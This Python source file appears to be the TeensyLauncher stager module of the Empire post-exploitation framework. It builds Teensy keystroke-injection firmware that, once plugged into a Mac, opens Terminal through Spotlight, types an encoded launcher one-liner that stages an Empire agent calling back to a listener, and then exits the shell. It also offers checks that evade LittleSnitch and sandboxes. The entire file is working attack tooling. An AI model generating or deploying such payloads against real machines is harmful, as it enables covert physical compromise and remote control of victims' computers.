from __future__ import print_function
from builtins import object
from empire.server.common import helpers


class Stager(object):

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'TeensyLauncher',

            'Author': ['Matt @matterpreter Hand'],

            'Description': 'Generates a Teensy script that runs a one-liner stage0 launcher for Empire.',

            'Comments': [
                ''
            ]
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Listener': {
                'Description': 'Listener to generate stager for.',
                'Required': True,
                'Value': ''
            },
            'Language': {
                'Description': 'Language of the stager to generate.',
                'Required': True,
                'Value': 'python',
                'SuggestedValues': ['python'],
                'Strict': True
            },
            'OutFile': {
                'Description': 'Filename that should be used for the generated output, otherwise returned as a string.',
                'Required': False,
                'Value': ''
            },
            'SafeChecks': {
                'Description': 'Switch. Checks for LittleSnitch or a SandBox, exit the staging process if true. '
                               'Defaults to True.',
                'Required': True,
                'Value': 'True',
                'SuggestedValues': ['True', 'False'],
                'Strict': True
            },
            'UserAgent': {
                'Description': 'User-agent string to use for the staging request (default, none, or other).',
                'Required': False,
                'Value': 'default'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value

    def generate(self):

        # extract all of our options
        language = self.options['Language']['Value']
        listener_name = self.options['Listener']['Value']
        user_agent = self.options['UserAgent']['Value']
        safe_checks = self.options['SafeChecks']['Value']

        # generate the launcher code
        launcher = self.mainMenu.stagers.generate_launcher(listener_name, language=language, encode=True,
                                                           userAgent=user_agent, safeChecks=safe_checks)

        if launcher == "":
            print(helpers.color("[!] Error in launcher command generation."))
            return ""

        else:
            launcher = launcher.replace('"', '\\"')

            teensy_code = "void clearKeys (){\n"
            teensy_code += "    delay(200);\n"
            teensy_code += "    Keyboard.set_key1(0);\n"
            teensy_code += "    Keyboard.set_key2(0);\n"
            teensy_code += "    Keyboard.set_key3(0);\n"
            teensy_code += "    Keyboard.set_key4(0);\n"
            teensy_code += "    Keyboard.set_key5(0);\n"
            teensy_code += "    Keyboard.set_key6(0);\n"
            teensy_code += "    Keyboard.set_modifier(0);\n"
            teensy_code += "    Keyboard.send_now();\n"
            teensy_code += "}\n\n"
            teensy_code += "void mac_minWindows(void) {\n"
            teensy_code += "    delay(200);\n"
            teensy_code += "    Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);\n"
            teensy_code += "    Keyboard.send_now();\n"
            teensy_code += "    Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI | MODIFIERKEY_ALT);\n"
            teensy_code += "    Keyboard.send_now();\n"
            teensy_code += "    Keyboard.set_key1(KEY_H);\n"
            teensy_code += "    Keyboard.set_key2(KEY_M);\n"
            teensy_code += "    Keyboard.send_now();\n"
            teensy_code += "    clearKeys();\n"
            teensy_code += "}\n\n"
            teensy_code += "void mac_openSpotlight(void) {\n"
            teensy_code += "    Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);\n"
            teensy_code += "    Keyboard.set_key1(KEY_SPACE);\n"
            teensy_code += "    Keyboard.send_now();\n"
            teensy_code += "    clearKeys();\n"
            teensy_code += "}\n\n"
            teensy_code += "void mac_openTerminal(void) {\n"
            teensy_code += "    delay(200);\n"
            teensy_code += "    Keyboard.print(\"Terminal\");\n"
            teensy_code += "    delay(500);\n"
            teensy_code += "    Keyboard.set_key1(KEY_ENTER);\n"
            teensy_code += "    Keyboard.send_now();\n"
            teensy_code += "    clearKeys();\n"
            teensy_code += "    Keyboard.set_modifier(MODIFIERKEY_GUI);\n"
            teensy_code += "    Keyboard.set_key1(KEY_N);\n"
            teensy_code += "    Keyboard.send_now();\n"
            teensy_code += "    clearKeys();\n"
            teensy_code += "}\n\n"
            teensy_code += "void empire(void) {\n"
            teensy_code += "    delay(500);\n"
            teensy_code += "    mac_minWindows();\n"
            teensy_code += "    mac_minWindows();\n"
            teensy_code += "    delay(500);\n"
            teensy_code += "    mac_openSpotlight();\n"
            teensy_code += "    mac_openTerminal();\n"
            teensy_code += "    delay(2500);\n"
            teensy_code += "    Keyboard.print(\"" + launcher + "\");\n"
            teensy_code += "    Keyboard.set_key1(KEY_ENTER);\n"
            teensy_code += "    Keyboard.send_now();\n"
            teensy_code += "    clearKeys();\n"
            teensy_code += "    delay(1000);\n"
            teensy_code += "    Keyboard.println(\"exit\");\n"
            teensy_code += "}\n\n"
            teensy_code += "void setup(void) {\n"
            teensy_code += "    empire();\n"
            teensy_code += "}\n\n"
            teensy_code += "void loop() {}"

            return teensy_code
